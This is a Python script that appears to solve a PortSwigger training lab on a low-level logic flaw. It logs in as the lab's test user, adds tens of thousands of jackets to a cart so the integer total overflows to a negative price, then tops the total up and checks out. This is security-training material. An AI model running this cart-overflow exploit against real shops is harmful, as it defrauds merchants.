#!/usr/bin/env python3
# Lab: Low-level logic flaw
# Lab-Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import math
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def login(client, url):
    csrf = get_csrf_token(client.get(url).text)
    data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
    r = client.post(url, data=data)
    return 'Your username is: wiener' in r.text


def get_details(text):
    soup = BeautifulSoup(text, 'html.parser')
    print
    jacket = soup.find('img', attrs={'src': '/image/productcatalog/specialproducts/LeetLeatherJacket.jpg'})
    ret = {}
    ret['jacket'] = {'price': jacket.parent.contents[6].strip().lstrip('$'),
                     'name': jacket.find_next_sibling('h3').text,
                     'product_id': jacket.find_next_sibling('a')['href'].split('=')[1]}
    next_item = jacket.parent.nextSibling.nextSibling
    ret['other'] = {'price': next_item.contents[6].strip().lstrip('$'),
                    'name': next_item.find_next('h3').text,
                    'product_id': next_item.find_next('a')['href'].split('=')[1]}
    return ret


def add_to_cart(client, url, item, amount):
    def perform_request(client, url, item, amount):
        data = {'productId': item['product_id'],
                'quantity': amount,
                'redir': 'CART'}
        client.post(url, data=data, allow_redirects=False)

    print(f'[+] Adding {item["name"]} to cart ', end='\r')
    for i in range(0, math.floor(amount / 99)):
        perform_request(client, url, item, 99)
        print(f'[+] Adding {item["name"]} to cart: {(i+1)*99} / {amount}', end='\r')
    perform_request(client, url, item, amount % 99)
    print(f'[+] Adding {item["name"]} to cart: {amount} / {amount}')


def purchase(client, url):
    csrf = get_csrf_token(client.get(url).text)
    data = {'csrf': csrf}
    r = client.post(f'{url}/checkout', data=data)
    return 'Congratulations, you solved the lab!' in r.text


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Obtain a discounted jacket')
    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    if not login(client, f'{host}/login'):
        print(f'[-] Failed to login as wiener')
        sys.exit(-2)
    print(f'[+] Logged in as wiener')

    res = client.get(host)
    details = get_details(res.text)
    add_to_cart(client, f'{host}/cart', details['jacket'], 32123)

    # Adding 32123 jackets brings the price to $-1221.96, so find the number
    # of items required to bring the price above zero
    required_amount = - math.floor(-1221.96 / float(details['other']['price']))
    add_to_cart(client, f'{host}/cart', details['other'], required_amount)

    print(f'[+] Attempting purchase')
    if purchase(client, f'{host}/cart'):
        print(f'[+] Purchase successful, enjoy the jacket')
    else:
        print(f'[-] Purchase failed')


if __name__ == "__main__":
    main()
